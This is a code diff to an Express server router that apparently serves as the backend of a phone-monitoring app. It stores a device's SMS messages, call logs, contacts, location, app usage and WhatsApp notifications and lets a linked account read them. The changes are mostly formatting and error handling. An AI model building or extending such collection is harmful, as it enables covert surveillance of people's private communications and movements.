@@ -6,6 +6,7 @@ const Location = require('../models/Location');
 const Device = require('../models/Device');
 const AppUsage = require('../models/AppUsage');
 const Notification = require('../models/Notification');
+const Media = require('../models/Media');
 
 const router = express.Router();
 const { requireUser } = require('../middleware/auth');
@@ -19,6 +20,10 @@ async function requireRegisteredDevice(deviceId) {
   return dev;
 }
 
+/* ---------------------------
+   POST endpoints (device -> server)
+   --------------------------- */
+
 // POST /api/sms
 router.post('/sms', async (req, res) => {
   try {
@@ -27,7 +32,9 @@ router.post('/sms', async (req, res) => {
     const doc = new Sms({
       deviceId,
       user: dev.user,
-      sender, message, timestamp: timestamp ? new Date(timestamp) : new Date()
+      sender,
+      message,
+      timestamp: timestamp ? new Date(timestamp) : new Date()
     });
     await doc.save();
     res.json({ ok: true });
@@ -46,7 +53,10 @@ router.post('/call', async (req, res) => {
     const doc = new Call({
       deviceId,
       user: dev.user,
-      number, type, state, timestamp: timestamp ? new Date(timestamp) : new Date(),
+      number,
+      type,
+      state,
+      timestamp: timestamp ? new Date(timestamp) : new Date(),
       duration: duration || 0
     });
     await doc.save();
@@ -66,6 +76,8 @@ router.post('/contacts', async (req, res) => {
     if (!Array.isArray(contacts)) return res.status(400).json({ error: 'contacts must be array' });
     const userId = dev.user;
     const docs = contacts.map(c => ({ deviceId, user: userId, name: c.name || '', number: c.number || '' }));
+    // optional: remove duplicates before insert (basic)
+    if (docs.length === 0) return res.json({ ok: true, inserted: 0 });
     await Contact.insertMany(docs);
     res.json({ ok: true, inserted: docs.length });
   } catch (e) {
@@ -83,7 +95,10 @@ router.post('/location', async (req, res) => {
     const doc = new Location({
       deviceId,
       user: dev.user,
-      lat, lon, accuracy: accuracy || 0, timestamp: timestamp ? new Date(timestamp) : new Date()
+      lat,
+      lon,
+      accuracy: accuracy || 0,
+      timestamp: timestamp ? new Date(timestamp) : new Date()
     });
     await doc.save();
 
@@ -91,7 +106,12 @@ router.post('/location', async (req, res) => {
     const io = req.app.locals.io;
     if (io && doc.user) {
       io.to(`user:${String(doc.user)}`).emit('location:new', {
-        _id: doc._id, deviceId: doc.deviceId, lat: doc.lat, lon: doc.lon, accuracy: doc.accuracy, timestamp: doc.timestamp
+        _id: doc._id,
+        deviceId: doc.deviceId,
+        lat: doc.lat,
+        lon: doc.lon,
+        accuracy: doc.accuracy,
+        timestamp: doc.timestamp
       });
     }
 
@@ -111,7 +131,9 @@ router.post('/app-usage', async (req, res) => {
     const doc = new AppUsage({
       deviceId,
       user: dev.user,
-      packageName, totalTime, lastTimeUsed: lastTimeUsed ? new Date(lastTimeUsed) : new Date()
+      packageName,
+      totalTime,
+      lastTimeUsed: lastTimeUsed ? new Date(lastTimeUsed) : new Date()
     });
     await doc.save();
     res.json({ ok: true });
@@ -140,7 +162,11 @@ router.post('/whatsapp', async (req, res) => {
     const io = req.app.locals.io;
     if (io && note.user) {
       io.to(`user:${String(note.user)}`).emit('notification:new', {
-        _id: note._id, packageName: note.packageName, message: note.message, timestamp: note.timestamp, title: note.title
+        _id: note._id,
+        packageName: note.packageName,
+        message: note.message,
+        timestamp: note.timestamp,
+        title: note.title
       });
     }
 
@@ -156,49 +182,82 @@ router.post('/whatsapp', async (req, res) => {
    GET endpoints (protected)
    --------------------------- */
 
-const SmsModel = require('../models/Sms');
-const CallModel = require('../models/Call');
-const ContactModel = require('../models/Contact');
-const LocationModel = require('../models/Location');
-const MediaModel = require('../models/Media');
-const AppUsageModel = require('../models/AppUsage');
-const NotificationModel = require('../models/Notification');
-const { requireUser } = require('../middleware/auth');
+const SmsModel = Sms;
+const CallModel = Call;
+const ContactModel = Contact;
+const LocationModel = Location;
+const MediaModel = Media;
+const AppUsageModel = AppUsage;
+const NotificationModel = Notification;
 
 router.get('/sms', requireUser, async (req, res) => {
-  const docs = await SmsModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(500).lean();
-  res.json(docs);
+  try {
+    const docs = await SmsModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(500).lean();
+    res.json(docs);
+  } catch (e) {
+    console.error('get sms err', e);
+    res.status(500).json({ error: 'server error' });
+  }
 });
 
 router.get('/call', requireUser, async (req, res) => {
-  const docs = await CallModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(500).lean();
-  res.json(docs);
+  try {
+    const docs = await CallModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(500).lean();
+    res.json(docs);
+  } catch (e) {
+    console.error('get call err', e);
+    res.status(500).json({ error: 'server error' });
+  }
 });
 
 router.get('/contacts', requireUser, async (req, res) => {
-  const docs = await ContactModel.find({ user: req.user.id }).sort({ name: 1 }).limit(5000).lean();
-  res.json(docs);
+  try {
+    const docs = await ContactModel.find({ user: req.user.id }).sort({ name: 1 }).limit(5000).lean();
+    res.json(docs);
+  } catch (e) {
+    console.error('get contacts err', e);
+    res.status(500).json({ error: 'server error' });
+  }
 });
 
 router.get('/location', requireUser, async (req, res) => {
-  const docs = await LocationModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(1000).lean();
-  res.json(docs);
+  try {
+    const docs = await LocationModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(1000).lean();
+    res.json(docs);
+  } catch (e) {
+    console.error('get location err', e);
+    res.status(500).json({ error: 'server error' });
+  }
 });
 
 router.get('/whatsapp', requireUser, async (req, res) => {
-  const docs = await NotificationModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(500).lean();
-  res.json(docs);
+  try {
+    const docs = await NotificationModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(500).lean();
+    res.json(docs);
+  } catch (e) {
+    console.error('get whatsapp err', e);
+    res.status(500).json({ error: 'server error' });
+  }
 });
 
 router.get('/app-usage', requireUser, async (req, res) => {
-  const docs = await AppUsageModel.find({ user: req.user.id }).sort({ createdAt: -1 }).limit(500).lean();
-  res.json(docs);
+  try {
+    const docs = await AppUsageModel.find({ user: req.user.id }).sort({ createdAt: -1 }).limit(500).lean();
+    res.json(docs);
+  } catch (e) {
+    console.error('get app-usage err', e);
+    res.status(500).json({ error: 'server error' });
+  }
 });
 
 router.get('/media', requireUser, async (req, res) => {
-  const docs = await MediaModel.find({ user: req.user.id }).sort({ uploadDate: -1 }).limit(500).lean();
-  res.json(docs);
+  try {
+    const docs = await MediaModel.find({ user: req.user.id }).sort({ uploadDate: -1 }).limit(500).lean();
+    res.json(docs);
+  } catch (e) {
+    console.error('get media err', e);
+    res.status(500).json({ error: 'server error' });
+  }
 });
 
 module.exports = router;
-
